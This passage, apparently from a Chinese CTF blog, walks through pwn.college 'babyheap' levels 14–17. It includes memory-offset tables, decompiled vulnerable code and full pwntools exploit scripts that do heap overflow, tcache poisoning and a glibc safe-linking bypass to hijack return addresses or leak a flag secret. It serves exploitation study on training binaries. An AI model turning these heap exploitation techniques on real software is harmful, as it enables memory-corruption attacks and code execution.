class="number">0x13AE</span></span><br><span class="line">win_offset = <span class="number">0x1A22</span></span><br><span class="line">pie_base = __libc_start_main_retaddr_value - start_offset</span><br><span class="line">win_addr= pie_base + win_offset</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(main_retaddr_offset)</span></span><br><span class="line"><span class="comment"># print(__libc_start_main_retaddr_offset)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(main_retaddr_value))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(__libc_start_main_retaddr_value))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(pie_base))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(win_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;canary = &quot;</span>,<span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line"><span class="comment">#3.在假堆块上溢出</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*canary_offset + p64(canary) </span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*(main_retaddr_offset - <span class="built_in">len</span>(payload)) + p64(win_addr)</span><br><span class="line"></span><br><span class="line">scanf(<span class="number">1</span>,payload)</span><br><span class="line"><span class="built_in">print</span>(proc.pidof(p)[<span class="number">0</span>])</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(proc.pidof(p)[<span class="number">0</span>])</span><br><span class="line">pause()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="level14.1">level14.1</h3>
<p>buffer视角</p>
<table>
<thead>
<tr>
<th></th>
<th>偏移</th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>buffer</td>
<td>0</td>
<td></td>
</tr>
<tr>
<td>…</td>
<td></td>
<td></td>
</tr>
<tr>
<td>prev_size</td>
<td>+ 0x30</td>
<td></td>
</tr>
<tr>
<td>size</td>
<td>+ 0x38</td>
<td></td>
</tr>
<tr>
<td>chunk_mem</td>
<td>+ 0x40</td>
<td></td>
</tr>
<tr>
<td>…</td>
<td></td>
<td></td>
</tr>
<tr>
<td>canary</td>
<td>+ 0x88</td>
<td></td>
</tr>
<tr>
<td>…</td>
<td></td>
<td></td>
</tr>
<tr>
<td>main_ret</td>
<td>+ 0x98</td>
<td></td>
</tr>
<tr>
<td>…</td>
<td></td>
<td></td>
</tr>
<tr>
<td>libc_start_main_ret</td>
<td>+ 0x168</td>
<td></td>
</tr>
</tbody>
</table>
<p>假堆块视角</p>
<table>
<thead>
<tr>
<th></th>
<th>偏移</th>
</tr>
</thead>
<tbody>
<tr>
<td>chunk_mem</td>
<td>0</td>
</tr>
<tr>
<td>…</td>
<td></td>
</tr>
<tr>
<td>canary</td>
<td>+ 0x48</td>
</tr>
<tr>
<td>…</td>
<td></td>
</tr>
<tr>
<td>main_ret</td>
<td>+ 0x58</td>
</tr>
<tr>
<td>…</td>
<td></td>
</tr>
<tr>
<td>overflow_limit</td>
<td>+ 0x7f</td>
</tr>
<tr>
<td>…</td>
<td></td>
</tr>
<tr>
<td>libc_start_main_ret</td>
<td>+ 0x128</td>
</tr>
</tbody>
</table>
<p>值得注意的是win函数地址的最低字节是0x9写不进去?换成0x1D就可以了?</p>
<h3 id="level15.0">level15.0</h3>
<p>只有堆块的增删改查业务</p>
<p>还是借助<code>echo</code>泄露堆栈地址,
然后在堆栈上构造假堆块,涵盖返回地址</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//echo</span></span><br><span class="line">  _WORD stack_var[<span class="number">7</span>]; <span class="comment">// [rsp+22h] [rbp-Eh] BYREF</span></span><br><span class="line">  <span class="built_in">strcpy</span>((<span class="type">char</span> *)stack_var, <span class="string">&quot;Data:&quot;</span>);</span><br><span class="line">  argv = (<span class="type">size_t</span> *)<span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line">  *argv = (<span class="type">size_t</span>)<span class="string">&quot;/bin/echo&quot;</span>;</span><br><span class="line">  argv[<span class="number">1</span>] = (<span class="type">size_t</span>)stack_var;</span><br></pre></td></tr></table></figure>
<p>每次<code>echo</code>都会有内存泄露,
<code>argv</code>这个堆块不会被释放</p>
<p><code>argv[1]</code>保存了<code>echo</code>的一个局部变量的地址,
可以利用这一点泄露堆栈地址</p>
<blockquote>
<p>然而现在不能使用<code>UAF</code>,
因为在<code>main</code>中释放堆块时会立刻将堆块指针清零,
避免了<code>UAF</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">      <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(input, <span class="string">&quot;free&quot;</span>) )            <span class="comment">// free</span></span><br><span class="line">...</span><br><span class="line">      <span class="built_in">free</span>(chunks[index_1]);</span><br><span class="line">      chunks[index_1] = <span class="number">0LL</span>;                  <span class="comment">// 没有UAF</span></span><br></pre></td></tr></table></figure>
</blockquote>
<p>但是<code>main</code>中<code>read</code>有堆溢出</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( <span class="built_in">strcmp</span>(input, <span class="string">&quot;read&quot;</span>) )                <span class="comment">// read</span></span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">__isoc99_scanf(<span class="string">&quot;%127s&quot;</span>, input);</span><br><span class="line"><span class="built_in">puts</span>(gaps);</span><br><span class="line">index_3 = atoi(input);</span><br><span class="line"><span class="keyword">if</span> ( index_3 &gt; <span class="number">0xF</span> )</span><br><span class="line">  __assert_fail(<span class="string">&quot;allocation_index &lt; 16&quot;</span>, <span class="string">&quot;&lt;stdin&gt;&quot;</span>, <span class="number">0x142</span>u, <span class="string">&quot;main&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Size: &quot;</span>);</span><br><span class="line">__isoc99_scanf(<span class="string">&quot;%127s&quot;</span>, input);</span><br><span class="line"><span class="built_in">puts</span>(gaps);</span><br><span class="line">sizea = atoi(input);	<span class="comment">//越界写多少完全自己决定</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] read(0, allocations[%d], %d)\n&quot;</span>, index_3, sizea);</span><br><span class="line">read(<span class="number">0</span>, chunks[index_3], sizea);</span><br><span class="line"><span class="built_in">puts</span>(gaps);</span><br></pre></td></tr></table></figure>
<p>综上,整个利用过程:</p>
<p>0x1.首先<code>chunk1 = malloc(0x20)</code>,拿到一个堆块,那么第一次<code>echo</code>时申请的堆块A,就紧跟在<code>chunk1</code>后面高处,这是溢出的必要条件</p>
<p>0x2.第二次<code>echo</code>,以<code>chunk1</code>为基地址,泄露堆块<code>A+0x8</code>偏移处的堆栈地址,并根据相对距离计算得到<code>main</code>函数和<code>libc_start_main</code>函数的返回地址</p>
<p>0x3.利用堆溢出造成任意地址读,根据<code>libc_start_main</code>返回到<code>start</code>中的地址,计算得到<code>pie</code>基址,根据<code>win</code>的偏移量计算得到<code>win</code>的地址</p>
<p>0x4.利用堆溢出造成的任意地址写,修改<code>main</code>函数的返回地址为<code>win</code></p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment"># p = process(&quot;./babyheap_level15.0&quot;)</span></span><br><span class="line">p = process(<span class="string">&quot;/challenge/babyheap_level15.0&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">malloc</span>(<span class="params">index,size</span>):</span><br><span class="line">    index = <span class="built_in">str</span>(index).encode()</span><br><span class="line">    size = <span class="built_in">str</span>(size).encode()</span><br><span class="line">    p.sendline(<span class="string">b&#x27;malloc&#x27;</span>)</span><br><span class="line">    p.sendline(index)</span><br><span class="line">    p.sendline(size)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">    index = <span class="built_in">str</span>(index).encode()</span><br><span class="line">    p.sendline(<span class="string">b&#x27;free&#x27;</span>)</span><br><span class="line">    p.sendline(index)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">echo</span>(<span class="params">index,offset,size=<span class="number">0</span></span>):</span><br><span class="line">    index = <span class="built_in">str</span>(index).encode()</span><br><span class="line">    offset = <span class="built_in">str</span>(offset).encode()</span><br><span class="line">    p.sendline(<span class="string">b&#x27;echo&#x27;</span>)</span><br><span class="line">    p.sendline(index)</span><br><span class="line">    p.sendline(offset)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Data: &#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span>(size == <span class="number">0</span>):</span><br><span class="line">        data = p.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        data = p.recv(size)</span><br><span class="line">    data = <span class="built_in">int</span>.from_bytes(data,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">index,size,content</span>):</span><br><span class="line">    index = <span class="built_in">str</span>(index).encode()</span><br><span class="line">    size = <span class="built_in">str</span>(size).encode()</span><br><span class="line">    p.sendline(<span class="string">b&#x27;read&#x27;</span>)</span><br><span class="line">    p.sendline(index)</span><br><span class="line">    p.sendline(size)    </span><br><span class="line">    p.sendline(content)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak</span>(<span class="params">addr</span>):				</span><br><span class="line">  malloc(<span class="number">2</span>,<span class="number">0x10</span>)</span><br><span class="line">  malloc(<span class="number">3</span>,<span class="number">0x10</span>)</span><br><span class="line">  malloc(<span class="number">4</span>,<span class="number">0x10</span>)</span><br><span class="line">  free(<span class="number">4</span>)</span><br><span class="line">  free(<span class="number">3</span>)</span><br><span class="line">  payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+ p64(<span class="number">0x31</span>)+p64(addr)</span><br><span class="line">  read(<span class="number">2</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">  malloc(<span class="number">5</span>,<span class="number">0x10</span>)</span><br><span class="line">  malloc(<span class="number">6</span>,<span class="number">0x10</span>)</span><br><span class="line">  data = echo(<span class="number">6</span>,<span class="number">0</span>,<span class="number">6</span>)</span><br><span class="line">  <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">modify</span>(<span class="params">addr,content</span>):</span><br><span class="line">  malloc(<span class="number">2</span>,<span class="number">0x10</span>)</span><br><span class="line">  malloc(<span class="number">3</span>,<span class="number">0x10</span>)</span><br><span class="line">  malloc(<span class="number">4</span>,<span class="number">0x10</span>)</span><br><span class="line">  free(<span class="number">4</span>)</span><br><span class="line">  free(<span class="number">3</span>)</span><br><span class="line">  payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+ p64(<span class="number">0x31</span>)+p64(addr)</span><br><span class="line">  read(<span class="number">2</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">  malloc(<span class="number">5</span>,<span class="number">0x10</span>)</span><br><span class="line">  malloc(<span class="number">6</span>,<span class="number">0x10</span>)</span><br><span class="line">  read(<span class="number">6</span>,<span class="number">6</span>,content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">malloc(<span class="number">0</span>,<span class="number">0x20</span>)</span><br><span class="line">echo(<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">data = echo(<span class="number">0</span>,<span class="number">0x38</span>,<span class="number">6</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(data))</span><br><span class="line">stack_leak_addr = data</span><br><span class="line"></span><br><span class="line">main_ret = stack_leak_addr + <span class="number">0x176</span></span><br><span class="line">libc_start_main_ret = stack_leak_addr + <span class="number">0x246</span></span><br><span class="line"></span><br><span class="line">data = leak(libc_start_main_ret)    <span class="comment">#arbitrary read</span></span><br><span class="line">pie_base = data - <span class="number">0x142E</span></span><br><span class="line">win_addr = pie_base + <span class="number">0x1B00</span></span><br><span class="line"></span><br><span class="line">modify(main_ret,p64(win_addr))      <span class="comment">#arbitrary write</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="level16.0">level16.0</h3>
<p>level16.0中使用libc-2.35,此时next指针已经被保护起来</p>
<p>利用
<code>tcache数据结构与算法/glibc-2.38/exploit/[safe-linking]*</code>的思路</p>
<p><strong>假设fake_chunk_mem已经对齐到0x10</strong></p>
<p>0x0.chunk0 = malloc(0x10)</p>
<p>0x1.chunk1 = malloc(0x10)</p>
<p>0x2.chunk2 = malloc(0x10)</p>
<p>0x3.free(chunk1)</p>
<p>0x4.free(chunk2)</p>
<p>0x5.[UAF] chunk2.next = ( 页框号 ) ^ (fake_chunk_mem)</p>
<p>0x6.chunk2 = malloc()</p>
<p>0x7.fake_chunk = malloc()</p>
<blockquote>
<p>此时fake_chunk.key归零</p>
<p>tcache-&gt;entries[idx] = REVEAL_PTR(fake_chunk.next)</p>
</blockquote>
<p>0x8.free(chunk0)</p>
<blockquote>
<p>此时chunk0.next = PROTECT_PTR(REVEAL_PTR(fake_chunk.next))</p>
</blockquote>
<p>0x9.[UAF] puts(chunk0.next)</p>
<p>0xA.计算fake_chunk.next</p>
<blockquote>
<p>fake_chunk.next = chunk0.next ^ (页框号) ^ (fake_chunk_addr &gt;&gt;
12)</p>
</blockquote>
<p>写个exp意思意思</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment"># p = process(&#x27;./babyheap_level16.0&#x27;)</span></span><br><span class="line">p = process(<span class="string">&#x27;/challenge/babyheap_level16.0&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">malloc</span>(<span class="params">index,size</span>):</span><br><span class="line">    index = <span class="built_in">str</span>(index).encode()</span><br><span class="line">    size = <span class="built_in">str</span>(size).encode()</span><br><span class="line">    p.sendline(<span class="string">b&#x27;malloc&#x27;</span>)</span><br><span class="line">    p.sendline(index)</span><br><span class="line">    p.sendline(size)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">    index = <span class="built_in">str</span>(index).encode()</span><br><span class="line">    p.sendline(<span class="string">b&#x27;free&#x27;</span>)</span><br><span class="line">    p.sendline(index)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">puts</span>(<span class="params">index, size = <span class="number">0</span></span>):</span><br><span class="line">    index = <span class="built_in">str</span>(index).encode() </span><br><span class="line">    p.sendline(<span class="string">b&#x27;puts&#x27;</span>)</span><br><span class="line">    p.sendline(index)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Data: &#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> size == <span class="number">0</span>:</span><br><span class="line">        data = p.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        data = p.recv(size)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">scanf</span>(<span class="params">index,content</span>):</span><br><span class="line">    index = <span class="built_in">str</span>(index).encode()</span><br><span class="line">    p.sendline(<span class="string">b&#x27;scanf&#x27;</span>)</span><br><span class="line">    p.sendline(index)</span><br><span class="line">    p.sendline(content)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_flag</span>(<span class="params">secret</span>):</span><br><span class="line">    p.sendline(<span class="string">b&#x27;send_flag&#x27;</span>)</span><br><span class="line">    p.sendline(secret)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak</span>(<span class="params">addr,size = <span class="number">0x10</span></span>):		//addr must be aligned to <span class="number">0x10</span></span><br><span class="line">    malloc(<span class="number">3</span>,size)</span><br><span class="line">    malloc(<span class="number">1</span>,size)</span><br><span class="line">    malloc(<span class="number">2</span>,size)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    chunk1_next = puts(<span class="number">1</span>)</span><br><span class="line">    chunk2_next = puts(<span class="number">2</span>)</span><br><span class="line">    chunk1_next = <span class="built_in">int</span>.from_bytes(chunk1_next, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">    chunk2_next = <span class="built_in">int</span>.from_bytes(chunk2_next, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(chunk1_next))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;chunk2_next previously = &quot;</span>,<span class="built_in">hex</span>(chunk2_next))</span><br><span class="line">    chunk2_next = chunk1_next ^ addr</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;chunk2_next now = &quot;</span>,<span class="built_in">hex</span>(chunk2_next))</span><br><span class="line">    scanf(<span class="number">2</span>,p64(chunk2_next))</span><br><span class="line"></span><br><span class="line">    malloc(<span class="number">2</span>,size)</span><br><span class="line">    malloc(<span class="number">1</span>,size)    </span><br><span class="line">    free(<span class="number">3</span>)</span><br><span class="line">    chunk3_next = puts(<span class="number">3</span>,<span class="number">8</span>)</span><br><span class="line">    chunk3_next = <span class="built_in">int</span>.from_bytes(chunk3_next, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">    ep = chunk1_next ^ chunk3_next</span><br><span class="line">    data = (addr &gt;&gt; <span class="number">12</span>) ^ ep</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line">    </span><br><span class="line">secret_addr = <span class="number">0x433050</span></span><br><span class="line">malloc(<span class="number">9</span>,<span class="number">0x20</span>)</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line">page_num = puts(<span class="number">9</span>)</span><br><span class="line">page_num = <span class="built_in">int</span>.from_bytes(page_num, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(page_num))</span><br><span class="line"></span><br><span class="line">data = leak(secret_addr,<span class="number">0x10</span>)		//secret_addr = <span class="number">0x433050</span> <span class="keyword">is</span> aligned to <span class="number">0x10</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(data))</span><br><span class="line">data = data.to_bytes(<span class="number">8</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(data)</span><br><span class="line"></span><br><span class="line">payload = data + p64(<span class="number">0</span>) </span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line"></span><br><span class="line">send_flag(payload)</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="level17.0">level17.0</h3>
<p>ret2text</p>
<p>利用堆UAF将返回地址放到堆块上</p>
<p>调试发现返回地址都对齐到0x8</p>
<p>不满足堆块对齐到0x10的要求</p>
<p>因此假堆块可以在返回地址-0x8,-0x18等处</p>
<p>但是还有高手</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">v3 = malloc_usable_size(chunks[index_2]);</span><br><span class="line"><span class="built_in">sprintf</span>(input, <span class="string">&quot;%%%us&quot;</span>, v3);</span><br><span class="line">v4 = malloc_usable_size(chunks[index_2]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] scanf(\&quot;%%%us\&quot;, allocations[%d])\n&quot;</span>, v4, index_2);</span><br><span class="line"><span class="built_in">scanf</span>(input, chunks[index_2]);</span><br></pre></td></tr></table></figure>
<p>在往假堆块写入之前,还有一个库函数<code>malloc_usable_size</code>调用,这位更是重量级,他会调用<code>musable</code></p>
<p>这位更是重中之重量级</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">size_t</span></span><br><span class="line"><span class="title function_">musable</span><span class="params">(<span class="type">void</span> *mem)</span></span><br><span class="line">&#123;</span><br><span class="line">    mchunkptr p = mem2chunk(mem);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (chunk_is_mmapped(p))</span><br><span class="line">        <span class="keyword">return</span> chunksize(p) - CHUNK_HDR_SZ;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (inuse(p))</span><br><span class="line">        <span class="keyword">return</span> memsize(p);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如果<code>p</code>没有<code>Mmap (2)</code>标志位,会调用<code>inuse(p)</code>这个函数会查看<strong>下一个</strong>堆块的<code>Prev_in_use (1)</code>标志位来判定<strong>当前</strong>堆块是否使用</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> inuse(p)							      \</span></span><br><span class="line"><span class="meta">  ((((mchunkptr) (((char *) (p)) + chunksize (p)))-&gt;mchunk_size) &amp; PREV_INUSE)</span></span><br></pre></td></tr></table></figure>
<p>找下一个堆块的依据是本堆块的<code>size</code>,</p>
<p>也就是说<code>p + p.size</code>就偏移到了下一个堆块</p>
<p>问题就来了,本堆块的<code>size</code>是不能确定的,本堆块是一个假堆块,很可能是一个非常大的数</p>
<p>导致<code>p+p.size</code>指向非法内存区域,导致<code>(p + p.size)-&gt;size</code>解引用失败,导致程序崩溃</p>
<p>现在考虑我们可能的受害者返回地址</p>
<p>main ret2 libc_start_main</p>
<p>libc_start_main ret2 start</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2024/10/17/%E8%B0%83%E8%AF%95Glibc/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/10/17/%E8%B0%83%E8%AF%95Glibc/" class="post-title-link" itemprop="url">glibc 相关备忘</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2024-10-17 23:20:00 / Modified: 23:25:26" itemprop="dateCreated datePublished" datetime="2024-10-17T23:20:00+08:00">2024-10-17</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="源码调试glibc">源码调试Glibc</h1>
<h2 id="系统自带glibc的缺点">系统自带glibc的缺点</h2>
<p>在我们尝试观察延迟绑定机制时,</p>
<p>需要观察_dl_runtime_resolve和dl_fixup这两个函数</p>
<p>这两个函数都位于ld-linux.so.2 动态库中</p>
<p>默认情况下使用gcc编译程序时,动态链接的glibc动态库文件,都在/lib下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/usr/src/CTF-All-In-One/src/writeup/<span class="number">6.1</span><span class="number">.3</span>_pwn_xdctf2015_pwn200<span class="meta"># ldd /bin/cat</span></span><br><span class="line">        linux-vdso.so<span class="number">.1</span> (<span class="number">0x00007fffee15a000</span>)</span><br><span class="line">        libc.so<span class="number">.6</span> =&gt; /lib/x86_64-linux-gnu/libc.so<span class="number">.6</span> (<span class="number">0x00007f36b527b000</span>)</span><br><span class="line">        /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span> (<span class="number">0x00007f36b5875000</span>)</span><br><span class="line">root@Destroyer:/usr/src/CTF-All-In-One/src/writeup/<span class="number">6.1</span><span class="number">.3</span>_pwn_xdctf2015_pwn200<span class="meta"># ldd ./test</span></span><br><span class="line">        linux-gate.so<span class="number">.1</span> 